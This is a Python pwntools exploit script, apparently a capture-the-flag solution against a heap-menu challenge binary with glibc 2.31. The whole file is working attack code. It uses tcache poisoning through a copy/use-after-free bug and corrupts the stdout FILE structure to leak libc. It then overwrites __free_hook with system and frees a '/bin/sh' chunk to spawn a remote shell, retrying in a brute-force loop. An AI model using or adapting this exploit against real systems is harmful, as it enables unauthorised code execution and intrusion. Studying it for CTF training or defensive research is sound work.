#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

#p = process()
#p = remote('172.31.3.2', 4240)
def alloc(index, size):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'index > ',str(index))
    p.sendlineafter(b'size > ',str(size))

def free(index):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b"index > ", str(index))

def edit(index, txt):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b"index > ", str(index))
    p.sendafter(b"content > ",txt)

def copy(index1, index2):
    p.sendlineafter(b'> ',b'4')
    p.sendlineafter(b'index1 > ', str(index1))
    p.sendlineafter(b'inde2 > ', str(index2))

while True:
    p = remote('172.31.3.2',4240)
    alloc(1, 0x420)
    alloc(2, 0x10)

    free(1)
    alloc(3, 0x60) 
    alloc(4, 0x60)
    alloc(5, 0x60)


    free(4) #2
    free(5) #1

    copy(5, 3)
    edit(5, p16(0x36a0))
    alloc(6, 0x60)
    alloc(7, 0x60)
    try: 
        edit(7, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
        libc.address = u64(p.recvline()[8:16]) -  0x1ec980
        log.info(f'libc: {hex(libc.address)}')

        libc_freehook = libc.sym.__free_hook
        libc_system = libc.sym.system
        

        alloc(8, 0x50)
        alloc(9, 0x50)

        free(9)
        free(8)

        edit(8,p64(libc_freehook))
        alloc(10, 0x50)
        alloc(11, 0x50)

        edit(11, p64(libc_system))
        alloc(12, 0x30)

        edit(12, b'/bin/sh\x00')
        free(12)
        break
    except:
        p.close()


p.interactive()
